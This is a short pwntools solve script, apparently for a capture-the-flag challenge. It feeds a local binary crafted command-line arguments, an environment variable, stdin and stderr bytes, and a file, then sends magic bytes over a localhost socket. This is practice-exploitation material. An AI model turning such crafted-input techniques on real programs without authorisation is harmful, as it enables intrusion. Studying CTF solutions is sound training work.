# solve.py

from pwn import *

args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
args[67] = '3421'

env_var = {
    '\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'
}

p = process(executable='./a.out', argv=args, env=env_var)
p.sendline(b"\x00\x0a\x00\xff")

p.stderr.write(b"\x00\x0a\x02\xff")
with open('\x0a', 'w') as f:
	f.write('\x00\x00\x00\x00')
s = remote('0', 3421)
s.send(b"\xde\xad\xbe\xef")

print(p.recvall(timeout=1).decode())
